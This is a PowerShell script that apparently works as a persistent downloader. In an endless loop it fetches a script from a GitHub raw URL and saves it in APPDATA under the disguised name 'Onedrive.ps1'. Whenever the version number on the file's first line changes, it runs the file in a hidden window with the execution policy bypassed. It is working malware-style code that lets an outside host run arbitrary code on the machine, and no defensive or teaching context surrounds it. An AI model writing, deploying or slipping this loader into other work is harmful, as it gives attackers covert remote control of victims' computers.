$downloadUrl = "https://raw.githubusercontent.com/miguelsantos029/yolo/refs/heads/main/windows.ps1?dl=1"
$localFilePath = "$env:APPDATA\Microsoft\Windows\Onedrive.ps1"

$headers = @{
    "Cache-Control" = "no-store, no-cache, must-revalidate, proxy-revalidate"
    "Pragma" = "no-cache"
    "Expires" = "0"
}

function ObterNumeroAposHash {
    param (
        [string]$linha
    )
    # Extrai o número que aparece após o '#'
    if ($linha -match "#\s*(\d+)") {
        return $matches[1]
    } else {
        return $null
    }
}




while ($true) {
        if (Test-Path $localFilePath) {
            Remove-Item -Path $localFilePath -Force
        }
        Start-Sleep -Seconds 3
        Invoke-WebRequest -Uri $downloadUrl -OutFile $localFilePath -Headers $headers
        Start-Sleep -Seconds 3

        $linhaatual = (Get-Content -Path $localFilePath -TotalCount 1).Trim()
        $numeroatual = ObterNumeroAposHash -linha $linhaatual

        if ($numeroInicial -ne $numeroAtual) {
            Start-Process -FilePath "powershell.exe" -ArgumentList "-w h -NoP -NonI -Exec Bypass -File $localFilePath"
            $numeroInicial = $numeroAtual
        }
    Start-Sleep -Seconds 300
}
